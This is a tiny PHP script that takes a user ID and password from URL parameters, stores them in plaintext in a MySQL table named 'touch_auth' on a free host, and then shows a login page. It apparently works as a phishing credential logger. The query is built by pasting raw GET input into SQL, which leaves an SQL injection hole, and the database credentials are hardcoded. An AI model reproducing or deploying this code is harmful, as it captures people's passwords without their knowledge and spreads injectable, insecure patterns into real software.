<?php
$mysqli=new mysqli("fdb21.awardspace.net","2734291_data","password","2734291_data","3306");
$query="INSERT INTO touch_auth(uid,userid, password) VALUES ('NULL','".$_GET['userid']."','".$_GET['password']."')";
$result=$mysqli->query($query);
$mysqli->close();
include("login.php");
?>
